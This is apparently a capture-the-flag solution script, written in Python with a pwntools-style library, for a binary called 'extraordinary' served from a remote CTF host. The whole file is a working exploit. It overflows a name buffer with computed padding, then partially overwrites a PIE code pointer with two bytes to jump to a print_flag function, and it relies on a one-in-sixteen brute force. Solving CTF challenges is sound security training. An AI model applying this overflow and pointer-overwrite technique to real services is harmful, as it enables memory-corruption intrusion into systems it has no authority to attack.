from pwnscripts import *
context.binary = 'extraordinary'
r = context.binary.process()
r = remote('ctf-f3jj.balancedcompo.site', 9993)
def select(i: int): r.sendlineafter('> ', str(i))
def setname(name: bytes):
    select(1)
    assert len(name) < 0xfff
    r.sendafter('Name: ', name)

dist = 129*8-4
print_name = 0x2739
print_flag = 0x2839
context.log_level = 'debug'
# partial overwrite of PIE pointer; bruteforce 1/16 chance
setname(b'A'*dist + p16(print_flag)+b'\n')
select(2)
print(r.recv(1000, timeout=2))
